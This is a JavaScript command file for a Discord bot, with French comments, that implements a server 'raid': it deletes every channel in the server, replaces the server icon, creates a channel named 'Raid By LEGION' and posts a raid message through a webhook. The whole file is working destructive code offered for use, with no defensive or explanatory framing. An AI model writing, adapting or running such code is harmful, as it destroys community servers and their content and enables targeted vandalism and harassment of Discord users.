module.exports = {
    name: "removechanel",
    aliases: [],
    description: "Supprime tous les canaux du serveur, crée un nouveau canal et un webhook au nom 'LEGION'.",
    run: async (message, args, command, client) => {
        // Supprime tous les canaux du serveur
        message.guild.channels.cache.forEach(async (channel) => {
            try {
                await channel.delete();
            } catch (error) {
                console.error('Erreur lors de la suppression du canal :', error);
            }
        });

        // Changer la photo du serveur
        const newServerIconURL = 'https://cdn.discordapp.com/attachments/858849789977952286/1170120429160124427/image.png?ex=6557e292&is=65456d92&hm=b451b98cfe4d816c745110983072ee37e176e42764b5dd0d5b48827f3b3c2ced&';
        message.guild.setIcon(newServerIconURL)
        .then(() => {
            // Crée un webhook au nom 'LEGION'
            message.guild.channels.create('Raid By LEGION', {
                type: 'text',
            })
            .then(newChannel => {
                newChannel.createWebhook('LEGION', {
                    avatar: newServerIconURL
                })
                .then(webhook => {
                    // Envoie un message dans le nouveau canal en utilisant le webhook
                    webhook.send("RAID BY LEGION :heart:")
                    .then(() => {
                        // Vous pouvez utiliser 'webhook' pour effectuer d'autres actions avec le webhook si nécessaire.
                    })
                    .catch(error => {
                        console.error('Erreur lors de l envoi du message via le webhook :', error);
                    });
                })
                .catch(error => {
                    console.error('Erreur lors de la création du webhook :', error);
                });
            })
            .catch(error => {
                console.error('Erreur lors de la création du canal :', error);
            });
        })
        .catch(error => {
            console.error('Erreur lors de la modification de l icône du serveur :', error);
        });
    }
}
